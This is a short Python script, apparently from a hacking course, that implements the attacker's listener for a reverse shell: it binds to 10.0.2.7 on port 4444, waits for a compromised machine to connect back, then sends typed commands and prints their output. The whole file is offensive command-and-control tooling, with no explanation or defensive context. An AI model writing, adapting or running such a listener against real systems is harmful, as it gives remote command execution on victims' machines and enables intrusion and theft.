#!/usr/bin/env python

import socket

class Listener:

    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((ip, port))
        listener.listen(0)
        print ('[+] waiting for connections')
        self.connection, address = listener.accept()
        print ('[+] got a connection from ' + str(address[0]))

    def run(self):
        while True:
            command = raw_input('>>> ')
            self.connection.send(command)
            result = self.connection.recv(1024)
            print (result)

my_listener = Listener('10.0.2.7', 4444)
my_listener.run()
